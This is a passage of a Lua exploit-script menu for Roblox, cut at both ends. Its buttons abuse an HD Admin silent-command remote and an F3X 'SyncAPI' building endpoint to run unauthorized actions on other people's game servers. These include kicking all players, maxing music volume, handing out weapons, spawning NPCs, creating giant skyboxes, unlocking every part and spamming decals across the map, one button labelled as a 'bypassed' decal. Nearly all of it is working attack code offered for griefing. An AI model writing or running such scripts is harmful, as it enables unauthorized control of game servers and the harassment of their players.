    
    -- Listen for players leaving
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
end

--// === Cleanup System ===
local function setupCleanup()
    -- Periodic cleanup of any orphaned particles
    while true do
        task.wait(10) -- Clean up every 10 seconds
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end

--// === Run Both Effects ===
GiantSky("172423468") -- your sky texture asset ID
startParticleSystem()
coroutine.wrap(setupCleanup)()
    end
})
AddButton({
    Name = "c00lify v2",
    Callback = function()
        
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Locate SyncAPI tool
for _, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper
local function _(args)
	remote:InvokeServer(unpack(args))
end

-- === Utility Functions ===
local function CreatePart(cf, parent)
	_({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
	_({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
	_({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
	_({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
	_({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
	_({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
	_({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
	_({"SetLocked", {part}, state})
end

local function SpawnDecal(part, side)
	_({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
end

local function AddDecal(part, asset, side)
	_({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})
end

-- === Normal Sky Function (smaller) ===
local function Sky(id)
	local hrp = char:WaitForChild("HumanoidRootPart")
	local cf = hrp.CFrame
	local pos = cf.Position + Vector3.new(0, 6, 0)
	CreatePart(CFrame.new(pos), workspace)
	task.wait(0.3) -- tiny delay for the part to exist
	for _, v in workspace:GetDescendants() do
		if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then
			SetAnchor(v, true)
			AddMesh(v)
			SetMesh(v, "111891702759441")
			SetTexture(v, id)
			MeshResize(v, Vector3.new(8000, 8000, 8000))
		end
	end
end

-- === Giant Skybox Function ===
local function GiantSky(id)
	local hrp = char:WaitForChild("HumanoidRootPart")
	local cf = hrp.CFrame
	local pos = cf.Position + Vector3.new(0, 6, 0)

	-- Create base part
	CreatePart(CFrame.new(pos), workspace)
	task.wait(0.3)

	for _, v in workspace:GetDescendants() do
		if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
			SetAnchor(v, true)
			AddMesh(v)
			SetMesh(v, "111891702759441") -- sphere/dome
			SetTexture(v, id)
			MeshResize(v, Vector3.new(99999, 99999, 99999)) -- massive size
			SetCollision(v, false)
			SetLocked(v, true)
		end
	end
end

-- === Spam Decals Function ===
local function Spam(id)
	for _, v in workspace:GetDescendants() do
		if v:IsA("BasePart") then
			task.spawn(function()
				SetLocked(v, false)
				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do
					SpawnDecal(v, side)
					AddDecal(v, id, side)
				end
			end)
		end
	end
end

-- === Call Functions ===
GiantSky("5151897861") -- giant skybox
Spam("158118263") -- spam decals
    end
})
AddButton({
    Name = "Normal Disco",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";disco")
    end
})
AddButton({
    Name = "Mario.exe Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("12851404448")
    end
})
AddButton({
    Name = "Mario.exe Skybox",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Locate SyncAPI tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

-- === Helper Functions ===
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

-- === Giant Skybox Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)

    -- Create a base part
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3) -- wait for it to exist

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere/dome mesh
            SetTexture(v, id)             -- your sky texture asset ID
            MeshResize(v, Vector3.new(90000, 90000, 90000)) -- massive size
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end
GiantSky("12851404448")

    end
})
AddButton({
    Name = "You Are A idiot",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 3200130016")
SilentRequest:InvokeServer(";volume inf")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

-- Locate SyncAPI tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper

local function _(args)

	remote:InvokeServer(unpack(args))

end

-- === Utility Functions ===

local function CreatePart(cf, parent)

	_({"CreatePart", "Normal", cf, parent})

end

local function SetAnchor(part, state)

	_({"SyncAnchor", {{Part = part, Anchored = state}}})

end

local function SetCollision(part, state)

	_({"SyncCollision", {{Part = part, CanCollide = state}}})

end

local function AddMesh(part)

	_({"CreateMeshes", {{Part = part}}})

end

local function SetMesh(part, meshid)

	_({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})

end

local function SetTexture(part, texid)

	_({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})

end

local function MeshResize(part, size)

	_({"SyncMesh", {{Part = part, Scale = size}}})

end

local function SetLocked(part, state)

	_({"SetLocked", {part}, state})

end

local function SpawnDecal(part, side)

	_({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})

end

local function AddDecal(part, asset, side)

	_({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. asset}}})

end

-- === Sky Function ===

local function Sky(id)

	local hrp = char:WaitForChild("HumanoidRootPart")

	local cf = hrp.CFrame

	local pos = cf.Position + Vector3.new(0, 6, 0)

	CreatePart(CFrame.new(pos), workspace)

	task.wait(0.3) -- tiny delay for the part to exist

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") and (v.Position - pos).Magnitude < 0.1 then

			SetAnchor(v, true)

			AddMesh(v)

			SetMesh(v, "111891702759441")

			SetTexture(v, id)

			MeshResize(v, Vector3.new(90000, 90000, 90000))

		end

	end

end

-- === Spam Decals Function ===

local function Spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			task.spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

-- === Call Sky and Spam silently ===

Sky("4616500111")

Spam("4616500111")
    end
})
AddButton({
    Name = "Me? Decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("131759102825983")
    end
})
AddButton({
    Name = "Kick all",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";kick all cry about it!!")
    end
})
AddButton({
    Name = "Rainbow Sword",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear me 159229806")
    end
})
AddButton({
    Name = "Luger Gun",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear me 95354288")
    end
})
AddButton({
    Name = "Fire Sword",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear me 95951330")
    end
})
AddButton({
    Name = "Spawn Zombie",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";insert 187789986")
    end
})
AddButton({
    Name = "Spawn Soldier",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";insert 187790284")
    end
})
AddButton({
    Name = "Luger Gun All",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";gear all 95354288")
    end
})
AddButton({
    Name = "Cmdbar",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";cmdbar2")
    end
})
AddButton({
    Name = "Noot Noot Remake",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";unfog")
SilentRequest:InvokeServer(";time 0")
SilentRequest:InvokeServer(";fogcolor black")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Locate SyncAPI tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

-- Silent remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

-- === Helper Functions ===
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end

local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end

local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end

local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end

local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end

local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end

local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end

local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end

-- === Giant Skybox Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)

    -- Create a base part
    CreatePart(CFrame.new(pos), workspace)
    task.wait(0.3) -- wait for it to exist

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- sphere/dome mesh
            SetTexture(v, id)             -- your sky texture asset ID
            MeshResize(v, Vector3.new(90000, 90000, 90000)) -- massive size
            SetCollision(v, false)
            SetLocked(v, true)
        end
    end
end
GiantSky("382332426")


	-----------------------------------

	local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

			}

		}

	}

	_(args)

end

function CreateSpotlight(part)

	local args = {

		"CreateLights",

		{

			{

				Part = part,

				LightType = "SpotLight"

			}

		}

	}

	_(args)

end

function SyncLighting(part, brightness)

	local args = {

		"SyncLighting",

		{

			{

				Part = part,

				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Color(part, color)

	local args = {

		"SyncColor",

		{

			{

				Part = part,

				Color = color,

				UnionColoring = false

			}

		}

	}

	_(args)

end

function SpawnDecal(part, side)

	local args = {

		"CreateTextures",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal"

			}

		}

	}

	_(args)

end

function AddDecal(part, asset, side)

	local args = {

		"SyncTexture",

		{

			{

				Part = part,

				Face = side,

				TextureType = "Decal",

				Texture = "rbxassetid://" .. asset

			}

		}

	}

	_(args)

end

function spam(id)

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			spawn(function()

				SetLocked(v, false)

				for _, side in ipairs(Enum.NormalId:GetEnumItems()) do

					SpawnDecal(v, side)

					AddDecal(v, id, side)

				end

			end)

		end

	end

end

spam("382332426")
	-----------
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- DO NOT DELETE THIS LEAVE MY CREDIT

-- Rain Toad Script By ItsKittyyyGD 

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

for i, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

for i, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end

function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end

function SetAnchor(boolean, part)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end

function CreatePart(cf)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = workspace
    }
    _(args)
end

function Resize(part, size, cf)
    local args = {
        [1] = "SyncResize",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf,
                ["Size"] = size
            }
        }
    }
    _(args)
end

function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://" .. meshid
            }
        }
    }
    _(args)
end

function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://" .. texid
            }
        }
    }
    _(args)
end

function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end

function SetName(part, stringg)
    local args = {
        [1] = "SetName",
        [2] = {
            [1] = workspace.Part
        },
        [3] = stringg
    }
    _(args)
end

function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
            SetAnchor(true, v)
            AddMesh(v)
            SetMesh(v, "14832966960")
            SetTexture(v, id)
            MeshResize(v, Vector3.new(0, 0, 0))
        end
    end
end

local function createRainToads()
    while true do
        wait(0.001) -- Here they change the appearance time of the Toads or other meshes
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrpcf = player.Character.HumanoidRootPart.CFrame
            local x = hrpcf.x
            local z = hrpcf.z
            local randint = math.random(-600, 600)
            local randint2 = math.random(-600, 600)
            local xloc = randint + x
            local zloc = randint2 + z
            local cf = player.Character.HumanoidRootPart.CFrame.y + 400

            spawn(function()
                local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
                for i, v in game.Workspace:GetDescendants() do
                    if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
                        SetName(v, "NOOT NOOT") -- Here the name of the toad changes
                        SetAnchor(false, v)
                        AddMesh(v)
                        Resize(v, Vector3.new(1, 1, 1), v.CFrame)
                        MeshResize(v, Vector3.new(200, 200, 200))
                        SetMesh(v, "111891702759441") -- Here put it A custom mesh
                        SetTexture(v, "382332426") -- X2
                        SetCollision(v, true)
                        v.Orientation = Vector3.new(0, 0, 0)

                        v.CFrame = v.CFrame + Vector3.new(0, 0, 0)

                        local sound = Instance.new("Sound", v)
                        sound.SoundId = "rbxassetid://153752123" -- Here the noise or another sound To the toads or other things It works when they appear 
                        sound.Volume = 0
                        sound.PlayOnRemove = true
                        sound:Destroy()
                    end
                end
            end)
        else
            wait(1)
        end
    end
end

coroutine.wrap(createRainToads)()

Sky("95921788891849") -- Here they change the skybox id 

-- Delete this if you are going to Use it in another script
    end
})
AddButton({
    Name = "Lnicky Bypassed decal",
    Callback = function()
        local player = game.Players.LocalPlayer

local char = player.Character or player.CharacterAdded:Wait()

local tool

for _, v in player:GetDescendants() do

	if v.Name == "SyncAPI" then		tool = v.Parent

	end

end

for _, v in game.ReplicatedStorage:GetDescendants() do

	if v.Name == "SyncAPI" then

		tool = v.Parent

	end

end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)

	remote:InvokeServer(unpack(args))

end

function SetCollision(part, boolean)

	local args = {

		"SyncCollision",

		{

			{

				Part = part,

				CanCollide = boolean

			}

		}

	}

	_(args)

end

function SetAnchor(boolean, part)

	local args = {

		"SyncAnchor",

		{

			{

				Part = part,

				Anchored = boolean

			}

		}

	}

	_(args)

end

function CreatePart(cf, parent)

	local args = {

		"CreatePart",

		"Normal",

		cf,

		parent

	}

	_(args)

end

function DestroyPart(part)

	local args = {

		"Remove",

		{ part }

	}

	_(args)

end

function MovePart(part, cf)

	local args = {

		"SyncMove",

		{

			{

				Part = part,

				CFrame = cf

			}

		}

	}

	_(args)

end

function Resize(part, size, cf)

	local args = {

		"SyncResize",

		{

			{

				Part = part,

				CFrame = cf,

				Size = size

			}

		}

	}

	_(args)

end

function AddMesh(part)

	local args = {

		"CreateMeshes",

		{

			{ Part = part }

		}

	}

	_(args)

end

function SetMesh(part, meshid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				MeshId = "rbxassetid://" .. meshid

			}

		}

	}

	_(args)

end

function SetTexture(part, texid)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				TextureId = "rbxassetid://" .. texid

			}

		}

	}

	_(args)

end

function SetName(part, name)

	local args = {

		"SetName",

		{ part },

		name

	}

	_(args)

end

function MeshResize(part, size)

	local args = {

		"SyncMesh",

		{

			{

				Part = part,

				Scale = size

			}

		}

	}

	_(args)

end

function Weld(part1, part2, lead)

	local args = {

		"CreateWelds",

		{ part1, part2 },

		lead

	}

	_(args)

end

function SetLocked(part, boolean)

	local args = {

		"SetLocked",

		{ part },

		boolean

	}

	_(args)

end

function SetTrans(part, transparency)

	local args = {

		"SyncMaterial",

		{

			{

				Part = part,

				Transparency = transparency

